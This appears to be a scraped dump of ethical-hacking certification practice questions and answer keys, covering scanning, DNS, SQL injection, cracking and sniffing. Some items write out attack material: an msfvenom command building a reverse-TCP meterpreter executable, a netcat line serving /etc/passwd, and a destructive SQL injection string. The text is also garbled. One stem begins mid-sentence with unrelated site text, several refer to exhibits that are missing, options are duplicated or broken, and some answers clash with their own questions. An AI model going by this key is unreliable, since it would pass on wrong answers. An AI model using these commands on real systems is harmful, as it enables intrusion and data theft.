"Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?","A. nmap -sn -pp < target ip address ><br>B. nmap -sn -PO < target IP address ><br>C. nmap -sn -PS < target IP address > ✓<br>D. nmap -sn -PA < target IP address ><br><br><b>Answer: C</b>"
"While testing a web application in development, you notice that the web server does not properly ignore the ??dot dot slash?? (../) character string and instead returns the file listing of a folder structure of the server. What kind of attack is possible in this scenario?","A. Cross-site scripting<br>B. Denial of service<br>C. SQL injection<br>D. Directory traversal ✓<br><br><b>Answer: D</b>"
"While examining audit logs, you discover that people are able to telnet into the SMTP server on port 25. You would like to block this, though you do not see any evidence of an attack or other wrong doing. However, you are concerned about affecting the normal functionality of the email server. From the following options choose how best you can achieve this objective?","A. Block port 25 at the firewall.<br>B. Shut off the SMTP service on the server.<br>C. Force all connections to use a username and password.<br>D. Switch from Windows Exchange to UNIX Sendmail.<br>E. None of the above. ✓<br><br><b>Answer: E</b>"
"Password cracking programs reverse the hashing process to recover passwords. (True/False.)","A. True<br>B. False ✓<br><br><b>Answer: B</b>"
"s) or you may contact us at the following address: Media Internet Consultants, Edif. Neptuno, Planta Baja, Ave. Ricardo J. Alfaro, Tumba Muerto, n/a Panama How will you determine if this is Real Anti-Virus or Fake Anti-Virus website?","A. Look at the website design, if it looks professional then it is a Real Anti-Virus website<br>B. Connect to the site using SSL, if you are successful then the website is genuine<br>C. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site ✓<br>D. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware<br>E. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware<br><br><b>Answer: C</b>"
"During the enumeration phase. Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?","A. Server Message Block (SMB) ✓<br>B. Network File System (NFS)<br>C. Remote procedure call (RPC)<br>D. Telnet<br><br><b>Answer: A</b>"
"Ethical backer jane Doe is attempting to crack the password of the head of the it department of ABC company. She Is utilizing a rainbow table and notices upon entering a password that extra characters are added to the password after submitting. What countermeasure is the company using to protect against rainbow tables?","A. Password key hashing<br>B. Password salting ✓<br>C. Password hashing<br>D. Account lockout<br><br><b>Answer: B</b>"
"An attacker runs netcat tool to transfer a secret file between two hosts. He is worried about information being sniffed on the network. How would the attacker use netcat to encrypt the information before transmitting onto the wire?","A. Machine A: netcat -l -p -s password 1234 < testfileMachine B: netcat <machine A IP> 1234<br>B. Machine A: netcat -l -e magickey -p 1234 < testfileMachine B: netcat <machine A IP> 1234<br>C. Machine A: netcat -l -p 1234 < testfile -pw passwordMachine B: netcat <machine A IP> 1234 -pw password<br>D. Use cryptcat instead of netcat ✓<br><br><b>Answer: D</b>"
"what is the correct way of using MSFvenom to generate a reverse TCP shellcode for windows?","A. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c<br>B. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c<br>C. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe ✓<br>D. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe<br><br><b>Answer: C</b>"
"jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However. Jane has a long, complex password on her router. What attack has likely occurred?","A. Wireless sniffing<br>B. Piggybacking<br>C. Evil twin ✓<br>D. Wardriving<br><br><b>Answer: C</b>"
"Fred is the network administrator for his company. Fred is testing an internal switch. From an external IP address, Fred wants to try and trick this switch into thinking it already has established a session with his computer. How can Fred accomplish this?","A. Fred can accomplish this by sending an IP packet with the RST/SIN bit and the source address of his computer.<br>B. He can send an IP packet with the SYN bit and the source address of his computer.<br>C. Fred can send an IP packet with the ACK bit set to zero and the source address of the switch.<br>D. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine. ✓<br><br><b>Answer: D</b>"
"Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of the users visiting the company's website. Which of the following tools did Taylor employ in the above scenario?","A. WebSite Watcher<br>B. web-Stat ✓<br>C. Webroot<br>D. WAFW00F<br><br><b>Answer: B</b>"
"An Internet Service Provider (ISP) has a need to authenticate users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network. Which AAA protocol is the most likely able to handle this requirement?","A. TACACS+<br>B. DIAMETER<br>C. Kerberos<br>D. RADIUS ✓<br><br><b>Answer: D</b>"
"In your cybersecurity class, you are learning about common security risks associated with web servers. One topic that comes up is the risk posed by using default server settings. Why is using default settings ona web - server considered a security risk, and what would be the best initial step to mitigate this risk?","A. Default settings cause server malfunctions; simplify the settings<br>B. Default settings allow unlimited login attempts; setup account lockout<br>C. Default settings reveal server software type; change these settings ✓<br>D. Default settings enable auto-updates; disable and manually patch<br><br><b>Answer: C</b>"
"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called which of the following?","A. Compound SQLi<br>B. Blind SQLi ✓<br>C. Classic SQLi<br>D. DMS-specific SQLi<br><br><b>Answer: B</b>"
"You're the security manager for a tech company that uses a database to store sensitive customer data. You have implemented countermeasures against SQL injection attacks. Recently, you noticed some suspicious activities and suspect an attacker is using SQL injection techniques. The attacker is believed to use different forms of payloads in his SQL queries. In the case of a successful SQL injection attack, which of the following payloads would have the most significant impact?","A. ??OR 'T=""1: This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data<br>B. ??OR username LIKE '%: This payload uses the LIKE operator to search for a specific pattern in a column<br>C. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss ✓<br>D. UNION SELECT NULL, NULL, NULL -- : This payload manipulates the UNION SQL operator, enabling the attacker to retrieve data from different database tables<br><br><b>Answer: C</b>"
"What is the least important information when you analyze a public IP address in a security alert?","A. DNS<br>B. Whois<br>C. Geolocation<br>D. ARP ✓<br><br><b>Answer: D</b>"
"What useful information is gathered during a successful Simple Mail Transfer Protocol (SMTP) enumeration?","A. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists. ✓<br>B. Reveals the daily outgoing message limits before mailboxes are locked<br>C. The internal command RCPT provides a list of ports open to message traffic.<br>D. A list of all mail proxy server addresses used by the targeted host<br><br><b>Answer: A</b>"
"Study the following log extract and identify the attack.","A. Hexcode Attack<br>B. Cross Site Scripting<br>C. Multiple Domain Traversal Attack<br>D. Unicode Directory Traversal Attack ✓<br><br><b>Answer: D</b>"
"You are analysing traffic on the network with Wireshark. You want to routinely run a cron job which will run the capture against a specific set of IPs - 192.168.8.0/24. What command you would use?","A. wireshark --fetch ''192.168.8*''<br>B. wireshark --capture --local masked 192.168.8.0 ---range 24<br>C. tshark -net 192.255.255.255 mask 192.168.8.0<br>D. sudo tshark -f''net 192 .68.8.0/24'' ✓<br><br><b>Answer: D</b>"
"What does the following command in netcat do? nc -l -u -p55555 < /etc/passwd","A. logs the incoming connections to /etc/passwd file<br>B. loads the /etc/passwd file to the UDP port 55555<br>C. grabs the /etc/passwd file when connected to UDP port 55555 ✓<br>D. deletes the /etc/passwd file when connected to the UDP port 55555<br><br><b>Answer: C</b>"
"You are programming a buffer overflow exploit and you want to create a NOP sled of 200 bytes in the program exploit.c What is the hexadecimal value of NOP instruction?","A. 0x60<br>B. 0x80<br>C. 0x70<br>D. 0x90 ✓<br><br><b>Answer: D</b>"
"Which of the following is the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?","A. SOA<br>B. biometrics<br>C. single sign on<br>D. PKI ✓<br><br><b>Answer: D</b>"
"What two conditions must a digital signature meet?","A. Has to be the same number of characters as a physical signature and must be unique.<br>B. Has to be unforgeable, and has to be authentic. ✓<br>C. Must be unique and have special characters.<br>D. Has to be legible and neat.<br><br><b>Answer: B</b>"
"Which of the following tools can be used to perform a zone transfer?","A. NSLookup ✓<br>B. Finger<br>C. Dig ✓<br>D. Sam Spade ✓<br>E. Host ✓<br>F. Netcat<br>G. Neotrace<br><br><b>Answer: ACDE</b>"
"One of your team members has asked you to analyze the following SOA record. What is the version? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.) (Choose four.)","A. 200303028 ✓<br>B. 3600<br>C. 604800<br>D. 2400<br>E. 60<br>F. 4800<br><br><b>Answer: A</b>"
"When discussing passwords, what is considered a brute force attack?","A. You attempt every single possibility until you exhaust all possible combinations or discover the password ✓<br>B. You threaten to use the rubber hose on someone unless they reveal their password<br>C. You load a dictionary of words into your cracking program<br>D. You create hashes of a large number of words and compare it with the encrypted passwords<br>E. You wait until the password expires<br><br><b>Answer: A</b>"
"You are working as a Security Analyst in a company XYZ that owns the whole subnet range of 23.0.0.0/8 and 192.168.0.0/8. While monitoring the data, you find a high number of outbound connections. You see that IP’s owned by XYZ (Internal) and private IP’s are communicating to a Single Public IP. Therefore, the Internal IP’s are sending data to the Public IP. After further analysis, you find out that this Public IP is a blacklisted IP, and the internal communicating devices are compromised. What kind of attack does the above scenario depict?","A. Botnet Attack ✓<br>B. Spear Phishing Attack<br>C. Advanced Persistent Threats<br>D. Rootkit Attack<br><br><b>Answer: A</b>"
"Joseph was the Web site administrator for the Mason Insurance in New York, who's main Web site was located at www.masonins.com. Joseph uses his laptop computer regularly to administer the Web site. One night, Joseph received an urgent phone call from his friend, Smith. According to Smith, the main Mason Insurance web site had been vandalized! All of its normal content was removed and replaced with an attacker's message ''Hacker Message: You are dead! Freaks!” From his office, which was directly connected to Mason Insurance's internal network, Joseph surfed to the Web site using his laptop. In his browser, the Web site looked completely intact. No changes were apparent. Joseph called a friend of his at his home to help troubleshoot the problem. The Web site appeared defaced when his friend visited using his DSL connection. So, while Smith and his friend could see the defaced page, Joseph saw the intact Mason Insurance web site. To help make sense of this problem, Joseph decided to access the Web site using hisdial-up ISP. He disconnected his laptop from the corporate internal network and used his modem to dial up the same ISP used by Smith. After his modem connected, he quickly typed www.masonins.com in his browser to reveal the following web page: After seeing the defaced Web site, he disconnected his dial-up line, reconnected to the internal network, and used Secure Shell (SSH) to log in directly to the Web server. He ran Tripwire against the entire Web site, and determined that every system file and all the Web content on the server were intact. How did the attacker accomplish this hack?","A. ARP spoofing<br>B. SQL injection<br>C. DNS poisoning ✓<br>D. Routing table injection<br><br><b>Answer: C</b>"
"Which of the following algorithms can be used to guarantee the integrity of messages being sent, in transit, or stored?","A. symmetric algorithms<br>B. asymmetric algorithms<br>C. hashing algorithms ✓<br>D. integrity algorithms<br><br><b>Answer: C</b>"
"In the field of cryptanalysis, what is meant by a “rubber-hose” attack?","A. Forcing the targeted keystream through a hardware-accelerated device such as an ASIC.<br>B. A backdoor placed into a cryptographic algorithm by its creator.<br>C. Extraction of cryptographic secrets through coercion or torture. ✓<br>D. Attempting to decrypt ciphertext by making logical assumptions about the contents of the original plaintext.<br><br><b>Answer: C</b>"
"In an internal security audit, the white hat hacker gains control over a user account and attempts to acquire access to another account's confidential files and information. How can he achieve this?","A. Privilege Escalation ✓<br>B. Shoulder-Surfing<br>C. Hacking Active Directory<br>D. Port Scanning<br><br><b>Answer: A</b>"
"Which DNS resource record can indicate how long any ""DNS poisoning"" could last?","A. MX<br>B. SOA ✓<br>C. NS<br>D. TIMEOUT<br><br><b>Answer: B</b>"
"Based on the following extract from the log of a compromised machine, what is the hacker really trying to steal?","A. har.txt<br>B. SAM file ✓<br>C. wwwroot<br>D. Repair file<br><br><b>Answer: B</b>"
"You are tasked to configure the DHCP server to lease the last 100 usable IP addresses in subnet to. 1.4.0/23. Which of the following IP addresses could be teased as a result of the new configuration?","A. 210.1.55.200<br>B. 10.1.4.254<br>C. 10..1.5.200 ✓<br>D. 10.1.4.156<br><br><b>Answer: C</b>"
"Log monitoring tools performing behavioral analysis have alerted several suspicious logins on a Linux server occurring during non-business hours. After further examination of all login activities, it is noticed that none of the logins have occurred during typical work hours. A Linux administrator who is investigating this problem realizes the system time on the Linux server is wrong by more than twelve hours. What protocol used on Linux servers to synchronize the time has stopped working?","A. Time Keeper<br>B. NTP ✓<br>C. PPP<br>D. OSPP<br><br><b>Answer: B</b>"
"Elliot is in the process of exploiting a web application that uses SQL as a back-end database. He’s determined that the application is vulnerable to SQL injection, and has introduced conditional timing delays into injected queries to determine whether they are successful. What type of SQL injection is Elliot most likely performing?","A. Error-based SQL injection<br>B. Blind SQL injection ✓<br>C. Union-based SQL injection<br>D. NoSQL injection<br><br><b>Answer: B</b>"
"When a normal TCP connection starts, a destination host receives a SYN (synchronize/start) packet from a source host and sends back a SYN/ACK (synchronize acknowledge). The destination host must then hear an ACK (acknowledge) of the SYN/ACK before the connection is established. This is referred to as the ""TCP three-way handshake."" While waiting for the ACK to the SYN ACK, a connection queue of finite size on the destination host keeps track of connections waiting to be completed. This queue typically empties quickly since the ACK is expected to arrive a few milliseconds after the SYN ACK. How would an attacker exploit this design by launching TCP SYN attack?","A. Attacker generates TCP SYN packets with random destination addresses towards a victim host<br>B. Attacker floods TCP SYN packets with random source addresses towards a victim host ✓<br>C. Attacker generates TCP ACK packets with random source addresses towards a victim host<br>D. Attacker generates TCP RST packets with random source addresses towards a victim host<br><br><b>Answer: B</b>"
"Under what conditions does a secondary name server request a zone transfer from a primary name server?","A. When a primary SOA is higher that a secondary SOA ✓<br>B. When a secondary SOA is higher that a primary SOA<br>C. When a primary name server has had its service restarted<br>D. When a secondary name server has had its service restarted<br>E. When the TTL falls to zero<br><br><b>Answer: A</b>"
"What tool can crack Windows SMB passwords simply by listening to network traffic?","A. This is not possible<br>B. Netbus<br>C. NTFSDOS<br>D. L0phtcrack ✓<br><br><b>Answer: D</b>"
"One of your team members has asked you to analyze the following SOA record. What is the TTL? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.)","A. 200303028<br>B. 3600<br>C. 604800<br>D. 2400 ✓<br>E. 60<br>F. 4800<br><br><b>Answer: D</b>"
"How can you determine if an LM hash you extracted contains a password that is less than 8 characters long?","A. There is no way to tell because a hash cannot be reversed<br>B. The right most portion of the hash is always the same ✓<br>C. The hash always starts with AB923D<br>D. The left most portion of the hash is always the same<br>E. A portion of the hash will be all 0's<br><br><b>Answer: B</b>"
"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may be logged on several files located in /var/log. Which file does NOT belongs to the list:","A. user.log<br>B. auth.fesg<br>C. wtmp ✓<br>D. btmp<br><br><b>Answer: C</b>"
"When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s Computer to update the router configuration. What type of an alert is this?","A. False negative<br>B. True negative<br>C. True positive<br>D. False positive ✓<br><br><b>Answer: D</b>"
"If you want to only scan fewer ports than the default scan using Nmap tool, which option would you use?","A. –r<br>B. –F ✓<br>C. –P<br>D. –sP<br><br><b>Answer: B</b>"
"ViruXine.W32 virus hides their presence by changing the underlying executable code. This Virus code mutates while keeping the original algorithm intact, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. Here is a section of the Virus code: What is this technique called?","A. Polymorphic Virus ✓<br>B. Metamorphic Virus<br>C. Dravidic Virus<br>D. Stealth Virus<br><br><b>Answer: A</b>"
"Study the snort rule given below: From the options below, choose the exploit against which this rule applies.","A. WebDav<br>B. SQL Slammer<br>C. MS Blaster ✓<br>D. MyDoom<br><br><b>Answer: C</b>"
"“........is an attack type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises, but actually has been set up to eavesdrop on wireless communications. It is the wireless version of the phishing scam. An attacker fools wireless users into connecting a laptop or mobile phone to a tainted hot- spot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent web site and luring people there.” Fill in the blank with appropriate choice.","A. Evil Twin Attack ✓<br>B. Sinkhole Attack<br>C. Collision Attack<br>D. Signal Jamming Attack<br><br><b>Answer: A</b>"
"You need a tool that can do network intrusion prevention and intrusion detection, function as a network sniffer, and record network activity, what tool would you most likely select?","A. Nmap<br>B. Cain & Abel<br>C. Nessus<br>D. Snort ✓<br><br><b>Answer: D</b>"
"While performing online banking using a Web browser, a user receives an email that contains a link to an interesting Web site. When the user clicks on the link, another Web browser session starts and displays a video of cats playing a piano. The next business day, the user receives what looks like an email from his bank, indicating that his bank account has been accessed from a foreign country. The email asks the user to call his bank and verify the authorization of a funds transfer that took place. What Web browser-based security vulnerability was exploited to compromise the user?","A. Clickjacking<br>B. Cross-Site Scripting<br>C. Cross-Site Request Forgery ✓<br>D. Web form input validation<br><br><b>Answer: C</b>"
"User A is writing a sensitive email message to user B outside the local network. User A has chosen to use PKI to secure his message and ensure only user B can read the sensitive email. At what layer of the OSI layer does the encryption and decryption of the message take place?","A. Application<br>B. Transport<br>C. Session<br>D. Presentation ✓<br><br><b>Answer: D</b>"
"A penetration tester is conducting a port scan on a specific host. The tester found several ports opened that were confusing in concluding the Operating System (OS) version installed. Considering that NMAP result below, which of the following is likely to be installed on the target machine by the OS? Starting NMAP 5.21 at 2011-03-15 11:06 NMAP scan report for 172.16.40.65 Host is up (1.00s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http 139/tcp open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp open MAC Address: 00:00:48:0D:EE:8","A. The host is likely a Linux machine.<br>B. The host is likely a printer. ✓<br>C. The host is likely a router.<br>D. The host is likely a Windows machine.<br><br><b>Answer: B</b>"
"Which type of sniffing technique is generally referred as MiTM attack?","A. Password Sniffing<br>B. ARP Poisoning ✓<br>C. Mac Flooding<br>D. DHCP Sniffing<br><br><b>Answer: B</b>"
"Bob, a network administrator at BigUniversity, realized that some students are connecting their notebooks in the wired network to have Internet access. In the university campus, there are many Ethernet ports available for professors and authorized visitors but not for students. He identified this when the IDS alerted for malware activities in the network. What should Bob do to avoid this problem?","A. Disable unused ports in the switches<br>B. Separate students in a different VLAN<br>C. Use the 802.1x protocol ✓<br>D. Ask students to use the wireless network<br><br><b>Answer: C</b>"
"A zone file consists of which of the following Resource Records (RRs)?","A. DNS, NS, AXFR, and MX records<br>B. DNS, NS, PTR, and MX records<br>C. SOA, NS, AXFR, and MX records<br>D. SOA, NS, A, and MX records ✓<br><br><b>Answer: D</b>"
"Which system consists of a publicly available set of databases that contain domain name registration contact information?","A. WHOIS ✓<br>B. CAPTCHA<br>C. IANA<br>D. IETF<br><br><b>Answer: A</b>"
"During an Xmas scan what indicates a port is closed?","A. No return response<br>B. RST ✓<br>C. ACK<br>D. SYN<br><br><b>Answer: B</b>"
"Every company needs a formal written document which spells out to employees precisely what they are allowed to use the company's systems for, what is prohibited, and what will happen to them if they break the rules. Two printed copies of the policy should be given to every employee as soon as possible after they join the organization. The employee should be asked to sign one copy, which should be safely filed by the company. No one should be allowed to use the company's computer systems until they have signed the policy in acceptance of its terms. What is this document called?","A. Information Audit Policy (IAP)<br>B. Information Security Policy (ISP) ✓<br>C. Penetration Testing Policy (PTP)<br>D. Company Compliance Policy (CCP)<br><br><b>Answer: B</b>"
"Eve is spending her day scanning the library computers. She notices that Alice is using a computer whose port 445 is active and listening. Eve uses the ENUM tool to enumerate Alice machine. From the command prompt, she types the following command. What is Eve trying to do?","A. Eve is trying to connect as a user with Administrator privileges<br>B. Eve is trying to enumerate all users with Administrative privileges<br>C. Eve is trying to carry out a password crack for user Administrator ✓<br>D. Eve is trying to escalate privilege of the null user to that of Administrator<br><br><b>Answer: C</b>"
"Bob is going to perform an active session hijack against Brownies Inc. He has found a target that allows session oriented connections (Telnet) and performs the sequence prediction on the target operating system. He manages to find an active session due to the high level of traffic on the network. What is Bob supposed to do next?","A. Take over the session<br>B. Reverse sequence prediction<br>C. Guess the sequence numbers ✓<br>D. Take one of the parties offline<br><br><b>Answer: C</b>"
"The network team has well-established procedures to follow for creating new rules on the firewall. This includes having approval from a manager prior to implementing any new rules. While reviewing the firewall configuration, you notice a recently implemented rule but cannot locate manager approval for it. What would be a good step to have in the procedures for a situation like this?","A. Have the network team document the reason why the rule was implemented without prior manager approval.<br>B. Monitor all traffic using the firewall rule until a manager can approve it.<br>C. Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.<br>D. Immediately roll back the firewall rule until a manager can approve it ✓<br><br><b>Answer: D</b>"
"Bob, a system administrator at TPNQM SA, concluded one day that a DMZ is not needed if he properly configures the firewall to allow access just to servers/ports, which can have direct internet access, and block the access to workstations. Bob also concluded that DMZ makes sense just when a stateful firewall is available, which is not the case of TPNQM SA. In this context, what can you say?","A. Bob can be right since DMZ does not make sense when combined with stateless firewalls<br>B. Bob is partially righ<br>C. He does not need to separate networks if he can create rules by destination IPs, one by one ✓<br>D. Bob is totally wron<br>E. DMZ is always relevant when the company has internet servers and workstations<br>F. Bob is partially righ<br>G. DMZ does not make sense when a stateless firewall is available<br><br><b>Answer: C</b>"
"As a Certified Ethical Hacker, you were contracted by a private firm to conduct an external security assessment through penetration testing. What document describes the specifics of the testing, the associated violations, and essentially protects both the organization’s interest and your liabilities as a tester?","A. Service Level Agreement<br>B. Project Scope<br>C. Rules of Engagement ✓<br>D. Non-Disclosure Agreement<br><br><b>Answer: C</b>"
"A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24. Which of the following has occurred?","A. The computer is not using a private IP address.<br>B. The gateway is not routing to a public IP address. ✓<br>C. The gateway and the computer are not on the same network.<br>D. The computer is using an invalid IP address.<br><br><b>Answer: B</b>"
"To determine if a software program properly handles a wide range of invalid input, a form of automated testing can be used to randomly generate invalid input in an attempt to crash the program. What term is commonly used when referring to this type of testing?","A. Randomizing<br>B. Bounding<br>C. Mutating<br>D. Fuzzing ✓<br><br><b>Answer: D</b>"
"In the context of Windows Security, what is a 'null' user?","A. A user that has no skills<br>B. An account that has been suspended by the admin<br>C. A pseudo account that has no username and password ✓<br>D. A pseudo account that was created for security administration purpose<br><br><b>Answer: C</b>"
"An attacker, using a rogue wireless AP, performed an MITM attack and injected an HTML code to embed a malicious applet in all HTTP connections. When users accessed any page, the applet ran and exploited many machines. Which one of the following tools the hacker probably used to inject HTML code?","A. Wireshark<br>B. Ettercap ✓<br>C. Aircrack-ng<br>D. Tcpdump<br><br><b>Answer: B</b>"
"Matthew, a black hat, has managed to open a meterpreter session to one of the kiosk machines in Evil Corp’s lobby. He checks his current SID, which is S-1-5-21-1223352397-1872883824-861252104-501. What needs to happen before Matthew has full administrator access?","A. He must perform privilege escalation. ✓<br>B. He needs to disable antivirus protection.<br>C. He needs to gain physical access.<br>D. He already has admin privileges, as shown by the “501” at the end of the SID.<br><br><b>Answer: A</b>"
"Eric has discovered a fantastic package of tools named Dsniff on the Internet. He has learnt to use these tools in his lab and is now ready for real world exploitation. He was able to effectively intercept communications between the two entities and establish credentials with both sides of the connections. The two remote ends of the communication never notice that Eric is relaying the information between the two. What would you call this attack?","A. Interceptor<br>B. Man-in-the-middle ✓<br>C. ARP Proxy<br>D. Poisoning Attack<br><br><b>Answer: B</b>"
"CompanyXYZ has asked you to assess the security of their perimeter email gateway. From your office in New York, you craft a specially formatted email message and send it across the Internet to an employee of CompanyXYZ. The employee of CompanyXYZ is aware of your test. Your email message looks like this: From: jim_miller@companyxyz.com To: michelle_saunders@companyxyz.com Subject: Test message Date: 4/3/2017 14:37 The employee of CompanyXYZ receives your email message. This proves that CompanyXYZ’s email gateway doesn’t prevent what?","A. Email Masquerading<br>B. Email Harvesting<br>C. Email Phishing<br>D. Email Spoofing ✓<br><br><b>Answer: D</b>"
"This TCP flag instructs the sending system to transmit all buffered data immediately.","A. SYN<br>B. RST<br>C. PSH ✓<br>D. URG<br>E. FIN<br><br><b>Answer: C</b>"
"Peter extracts the SIDs list from Windows 2000 Server machine using the hacking tool ""SIDExtractor"". Here is the output of the SIDs: From the above list identify the user account with System Administrator privileges.","A. John<br>B. Rebecca<br>C. Sheela<br>D. Shawn<br>E. Somia<br>F. Chang ✓<br>G. Micah<br><br><b>Answer: F</b>"
"Although FTP traffic is not encrypted by default, which layer 3 protocol would allow for end-to-end encryption of the connection?","A. SFTP<br>B. Ipsec ✓<br>C. SSL<br>D. FTPS<br><br><b>Answer: B</b>"
"Switches maintain a CAM Table that maps individual MAC addresses on the network to physical ports on the switch. In MAC flooding attack, a switch is fed with many Ethernet frames, each containing different source MAC addresses, by the attacker. Switches have a limited memory for mapping various MAC addresses to physical ports. What happens when the CAM table becomes full?","A. Switch then acts as hub by broadcasting packets to all machines on the network ✓<br>B. The CAM overflow table will cause the switch to crash causing Denial of Service<br>C. The switch replaces outgoing frame switch factory default MAC address of FF:FF:FF:FF:FF:FF<br>D. Every packet is dropped and the switch sends out SNMP alerts to the IDS port<br><br><b>Answer: A</b>"
"What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?","A. Man-in-the-middle attack<br>B. Meet-in-the-middle attack ✓<br>C. Replay attack<br>D. Traffic analysis attack<br><br><b>Answer: B</b>"
"Some clients of TPNQM SA were redirected to a malicious site when they tried to access the TPNQM main site. Bob, a system administrator at TPNQM SA, found that they were victims of DNS Cache Poisoning. What should Bob recommend to deal with such a threat?","A. The use of security agents in clients’ computers<br>B. The use of DNSSEC ✓<br>C. The use of double-factor authentication<br>D. Client awareness<br><br><b>Answer: B</b>"
"Why would you consider sending an email to an address that you know does not exist within the company you are performing a Penetration Test for?","A. To determine who is the holder of the root account<br>B. To perform a DoS<br>C. To create needless SPAM<br>D. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail ✓<br>E. To test for virus protection<br><br><b>Answer: D</b>"
"You have the SOA presented below in your Zone. Your secondary servers have not been able to contact your primary server to synchronize information. How long will the secondary servers attempt to contact the primary server before it considers that zone is dead and stops responding to queries? collegae.edu.SOA, cikkye.edu ipad.college.edu. (200302028 3600 3600 604800 3600)","A. One day<br>B. One hour<br>C. One week ✓<br>D. One month<br><br><b>Answer: C</b>"
"You have retrieved the raw hash values from a Windows 2000 Domain Controller. Using social engineering, you come to know that they are enforcing strong passwords. You understand that all users are required to use passwords that are at least 8 characters in length. All passwords must also use 3 of the 4 following categories: lower case letters, capital letters, numbers and special characters. With your existing knowledge of users, likely user account names and the possibility that they will choose the easiest passwords possible, what would be the fastest type of password cracking attack you can run against these hash values and still get results?","A. Online Attack<br>B. Dictionary Attack<br>C. Brute Force Attack<br>D. Hybrid Attack ✓<br><br><b>Answer: D</b>"
"Take a look at the following attack on a Web Server using obstructed URL: How would you protect from these attacks?","A. Configure the Web Server to deny requests involving ""hex encoded"" characters<br>B. Create rules in IDS to alert on strange Unicode requests ✓<br>C. Use SSL authentication on Web Servers<br>D. Enable Active Scripts Detection at the firewall and routers<br><br><b>Answer: B</b>"
"Which results will be returned with the following Google search query? site:target.com – site:Marketing.target.com accounting","A. Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting.<br>B. Results matching all words in the query.<br>C. Results for matches on target.com and Marketing.target.com that include the word “accounting”<br>D. Results matching “accounting” in domain target.com but not on the site Marketing.target.com ✓<br><br><b>Answer: D</b>"
"Why should the security analyst disable/remove unnecessary ISAPI filters?","A. To defend against social engineering attacks<br>B. To defend against webserver attacks ✓<br>C. To defend against jailbreaking<br>D. To defend against wireless attacks<br><br><b>Answer: B</b>"
